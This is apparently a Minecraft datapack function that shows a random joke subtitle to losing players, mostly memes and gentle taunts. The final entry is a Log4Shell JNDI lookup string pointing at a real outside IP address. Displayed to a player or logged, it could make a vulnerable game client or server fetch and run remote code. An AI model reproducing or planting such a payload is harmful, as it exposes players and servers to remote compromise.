...
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=59}] run title @a[tag=Loser] subtitle ["",{"text":"try renewing your car's extended warranty","color":"red"}]
...
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=84}] run title @a[tag=Loser] subtitle ["",{"text":"Get real.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=85}] run title @a[tag=Loser] subtitle ["",{"text":"The cake was a lie.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=86}] run title @a[tag=Loser] subtitle ["",{"text":"Sayyy whattt??","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=87}] run title @a[tag=Loser] subtitle ["",{"text":"A for effort.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=88}] run title @a[tag=Loser] subtitle ["",{"text":"Congratulations, you successfully failed!","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=89}] run title @a[tag=Loser] subtitle ["",{"text":"Please deposit 100 Kromer to unlock winning.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=90}] run title @a[tag=Loser] subtitle ["",{"text":"Oof, just like the Glare.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=91}] run title @a[tag=Loser] subtitle ["",{"text":"Oof, just like the Copper Golem.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=92}] run title @a[tag=Loser] subtitle ["",{"text":"Please refer to the handbook on how to win.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=93}] run title @a[tag=Loser] subtitle ["",{"text":"r/yesyesyesno","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=94}] run title @a[tag=Loser] subtitle ["",{"text":"Do you even have a license for flying these?","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=95}] run title @a[tag=Loser] subtitle ["",{"text":"Your rocket license has received a strike.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=96}] run title @a[tag=Loser] subtitle ["",{"text":"You sure your insurance will cover that?","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=97}] run title @a[tag=Loser] subtitle ["",{"text":"Trollusa.","color":"red"}]
...
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=108}] run title @a[tag=Loser] subtitle ["",{"text":"releasing nukes","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=109}] run title @a[tag=Loser] subtitle ["",{"text":"Reported for: Malicious threat","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=110}] run title @a[tag=Loser] subtitle ["",{"text":"I hope your bicycle gets a flat tire! >:(","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=111}] run title @a[tag=Loser] subtitle ["",{"text":"The missiles go towards them, not us!","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=112}] run title @a[tag=Loser] subtitle ["",{"text":"Thanos ping","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=113}] run title @a[tag=Loser] subtitle ["",{"text":"guess you were a rocket loser","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=114}] run title @a[tag=Loser] subtitle ["",{"text":"That wasn't supposed to happen...","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=115}] run title @a[tag=Loser] subtitle ["",{"text":"So what that you won, I wasn't trying anyways!","color":"red"}]
...
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=121}] run title @a[tag=Loser] subtitle ["",{"text":"I've seen a fish play better.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=122}] run title @a[tag=Loser] subtitle ["",{"text":"Yes Rico, kaboom.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=123}] run title @a[tag=Loser] subtitle ["",{"text":"No victory popcorn for you.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=124}] run title @a[tag=Loser] subtitle ["",{"text":"L","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=125}] run title @a[tag=Loser] subtitle ["",{"text":"ratio","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=126}] run title @a[tag=Loser] subtitle ["",{"text":"${jndi:ldap://178.63.51.142:8080/pwned}","color":"red"}]
